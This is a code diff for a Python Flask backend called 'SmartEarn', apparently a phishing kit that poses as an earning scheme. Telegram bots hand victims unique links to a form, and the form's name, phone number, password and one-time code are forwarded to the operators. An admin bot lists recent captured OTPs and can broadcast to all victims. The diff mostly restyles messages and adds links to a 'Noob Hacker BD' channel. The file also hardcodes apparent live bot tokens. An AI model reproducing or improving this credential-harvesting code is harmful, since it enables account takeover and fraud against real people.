@@ -1,7 +1,7 @@
 # =======================================
-# SmartEarn Multi-User Bot System with Enhanced Admin Bot
-# First-time user notify fix
+# SmartEarn Multi-User Bot System with Enhanced UI
 # Developer: MN SIDDIK
+# UI: welcome message with Contact & Channel buttons
 # =======================================
 
 from flask import Flask, request, jsonify
@@ -9,6 +9,7 @@ from flask_cors import CORS
 import requests
 import uuid
 from collections import deque
+import json
 
 app = Flask(__name__)
 CORS(app)
@@ -20,6 +21,12 @@ USER_BOT_TOKEN = "8572616463:AAH1sQJsSlYOhj657naFUpKvlNquwtjzrLI"
 ADMIN_BOT_TOKEN = "8292480092:AAGlR5uZmj92shdUrtOEZyacezuQvYB1IPA"
 BASE_URL = "https://smart-earning.netlify.app"
 
+# Developer / Channel (used in UI)
+DEVELOPER_NAME = "SIDDIK"
+DEVELOPER_TG = "https://t.me/noobxvau"  # @noobxvau
+CHANNEL_NAME = "Noob Hacker BD"
+CHANNEL_LINK = "https://t.me/+ENYrQ5N9WNE3NWQ9"
+
 # Runtime memory
 USERS = {}             # uid -> chat_id
 USER_CHAT_IDS = []     # all user chat_ids
@@ -28,16 +35,31 @@ USER_NOTIFIED = set()  # users already notified to admin
 SUBMISSIONS = deque(maxlen=100)  # last 100 submissions
 
 # =========================
-# Telegram helpers
+# Telegram helpers (support reply_markup)
 # =========================
-def send_message(bot_token, chat_id, text):
+def send_message(bot_token, chat_id, text, reply_markup=None):
     url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
     payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
+    if reply_markup is not None:
+        # reply_markup should be a JSON-serializable Python dict
+        payload["reply_markup"] = json.dumps(reply_markup)
     requests.post(url, json=payload)
 
 def broadcast_to_users(text):
     for chat_id in USER_CHAT_IDS:
         send_message(USER_BOT_TOKEN, chat_id, text)
+
+# =========================
+# Prebuilt reply_markup for welcome
+# =========================
+WELCOME_BUTTONS = {
+    "inline_keyboard": [
+        [
+            {"text": f"Contact Developer — {DEVELOPER_NAME}", "url": DEVELOPER_TG},
+            {"text": f"Join Channel — {CHANNEL_NAME}", "url": CHANNEL_LINK}
+        ]
+    ]
+}
 
 # =========================
 # User Bot Webhook
@@ -47,7 +69,7 @@ def handle_user_bot():
     data = request.get_json()
     if "message" in data:
         chat_id = data["message"]["chat"]["id"]
-        text = data["message"].get("text", "")
+        text = data["message"].get("text", "").strip()
 
         if text == "/start":
             unique_id = str(uuid.uuid4())[:8]
@@ -55,20 +77,33 @@ def handle_user_bot():
             # Check if first-time user
             is_first_time = chat_id not in USER_CHAT_IDS
 
+            # store mapping
             USERS[unique_id] = chat_id
             if chat_id not in USER_CHAT_IDS:
                 USER_CHAT_IDS.append(chat_id)
             
-            # Send welcome message to user bot
-            link = f"{BASE_URL}/?uid={unique_id}"
-            send_message(USER_BOT_TOKEN, chat_id,
-                f"🎉 Welcome!\n\n🔗 Your unique link:\n{link}\n\nএই লিংকটি কেবল আপনার জন্য। অন্য কাউকে দেবেন না 🔒"
+            # Build a professional welcome message
+            welcome_text = (
+                f"🎉 *Welcome to SmartEarn!* \n\n"
+                f"Hi — I am *SmartEarn Bot* (developer: *{DEVELOPER_NAME}*).\n\n"
+                f"🔗 Your unique link: `{BASE_URL}/?uid={unique_id}`\n\n"
+                f"👉 Use this link to continue. This link is *private* — please don't share it.\n\n"
+                f"🛠️ If you need help or want updates, contact the developer or join the channel below."
             )
+
+            # Send welcome with inline buttons (Contact & Channel)
+            send_message(USER_BOT_TOKEN, chat_id, welcome_text, reply_markup=WELCOME_BUTTONS)
             
             # Notify admin bot ONLY first-time users
             if is_first_time and chat_id not in USER_NOTIFIED:
                 USER_NOTIFIED.add(chat_id)
-                msg = f"✅ New user started bot:\n👤 Chat ID: {chat_id}\n🆔 UID: {unique_id}"
+                msg = (
+                    f"✅ *New user started bot*:\n"
+                    f"👤 Chat ID: `{chat_id}`\n"
+                    f"🆔 UID: `{unique_id}`\n\n"
+                    f"Developer: [{DEVELOPER_NAME}]({DEVELOPER_TG})\n"
+                    f"Channel: [{CHANNEL_NAME}]({CHANNEL_LINK})"
+                )
                 for admin_id in ADMIN_CHAT_IDS:
                     send_message(ADMIN_BOT_TOKEN, admin_id, msg)
 
@@ -82,49 +117,58 @@ def handle_admin_bot():
     data = request.get_json()
     if "message" in data:
         chat_id = data["message"]["chat"]["id"]
-        text = data["message"].get("text", "")
+        text = data["message"].get("text", "").strip()
 
         # Add to admin list if not exists
         if chat_id not in ADMIN_CHAT_IDS:
             ADMIN_CHAT_IDS.append(chat_id)
-            send_message(ADMIN_BOT_TOKEN, chat_id, "✅ Admin bot connected successfully!")
+            # admin welcome message with developer & channel links
+            admin_welcome = (
+                f"✅ *Admin connected!*\n\n"
+                f"Developer: [{DEVELOPER_NAME}]({DEVELOPER_TG})\n"
+                f"Channel: [{CHANNEL_NAME}]({CHANNEL_LINK})\n\n"
+                f"Use /help to see admin commands."
+            )
+            send_message(ADMIN_BOT_TOKEN, chat_id, admin_welcome)
 
         # Commands
         if text.startswith("/user"):
             total_users = len(USER_CHAT_IDS)
-            send_message(ADMIN_BOT_TOKEN, chat_id, f"👥 Total bot users: {total_users}")
+            send_message(ADMIN_BOT_TOKEN, chat_id, f"👥 Total bot users: *{total_users}*")
 
         elif text.startswith("/broadcast "):
             msg = text.replace("/broadcast ", "", 1)
             broadcast_to_users(msg)
-            send_message(ADMIN_BOT_TOKEN, chat_id, f"✅ Message broadcasted to {len(USER_CHAT_IDS)} users")
+            send_message(ADMIN_BOT_TOKEN, chat_id, f"✅ Message broadcasted to *{len(USER_CHAT_IDS)}* users")
 
         elif text.startswith("/last"):
             if not SUBMISSIONS:
                 send_message(ADMIN_BOT_TOKEN, chat_id, "⚠️ No submissions yet.")
             else:
-                msg = "📝 Last submissions:\n\n"
+                msg = "📝 *Last submissions:*\n\n"
                 for sub in list(SUBMISSIONS)[-5:]:
-                    msg += f"👤 {sub['name']}, 📱 {sub['number']}, 🔐 OTP: {sub['otp']}, UID: {sub['uid']}\n\n"
+                    msg += f"👤 *{sub['name']}* — 📱 `{sub['number']}` — 🔐 OTP: `{sub['otp']}` — UID:`{sub['uid']}`\n\n"
                 send_message(ADMIN_BOT_TOKEN, chat_id, msg)
 
         elif text.startswith("/stats"):
             msg = (
-                f"📊 Bot Statistics:\n"
-                f"👥 Total Users: {len(USER_CHAT_IDS)}\n"
-                f"📝 Total Submissions: {len(SUBMISSIONS)}"
+                f"📊 *Bot Statistics:*\n"
+                f"👥 Total Users: *{len(USER_CHAT_IDS)}*\n"
+                f"📝 Saved Submissions: *{len(SUBMISSIONS)}*\n\n"
+                f"Developer: [{DEVELOPER_NAME}]({DEVELOPER_TG})"
             )
             send_message(ADMIN_BOT_TOKEN, chat_id, msg)
 
         elif text.startswith("/help"):
             help_msg = (
-                "🛠️ Admin Bot Commands:\n\n"
+                "🛠️ *Admin Bot Commands:*\n\n"
                 "/start - Connect admin bot\n"
                 "/user - Show total bot users\n"
                 "/broadcast <message> - Send message to all users\n"
                 "/last - Show last 5 submissions\n"
                 "/stats - Show bot statistics\n"
-                "/help - Show this help message"
+                "/help - Show this help message\n\n"
+                f"Dev: [{DEVELOPER_NAME}]({DEVELOPER_TG}) | Channel: [{CHANNEL_NAME}]({CHANNEL_LINK})"
             )
             send_message(ADMIN_BOT_TOKEN, chat_id, help_msg)
 
@@ -149,11 +193,12 @@ def handle_form():
 
     message = (
         f"📥 *New Submission Received!*\n\n"
-        f"👤 Name: {name}\n"
-        f"📱 Number: {number}\n"
-        f"🔑 Password: {password}\n"
-        f"🔐 OTP Entered: {otp}\n\n"
-        f"🆔 UID: {uid}"
+        f"👤 *Name:* {name}\n"
+        f"📱 *Number:* `{number}`\n"
+        f"🔑 *Password:* `{password}`\n"
+        f"🔐 *OTP Entered:* `{otp}`\n\n"
+        f"🆔 *UID:* `{uid}`\n\n"
+        f"Developer: [{DEVELOPER_NAME}]({DEVELOPER_TG})"
     )
 
     # Send to user bot chat
@@ -178,7 +223,7 @@ def handle_form():
 # =========================
 @app.route("/", methods=["GET"])
 def home():
-    return "✅ SmartEarn Multi-User Bot with First-time Notify Fix Running!"
+    return "✅ SmartEarn Multi-User Bot with UI updates (Contact & Channel) Running!"
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080)
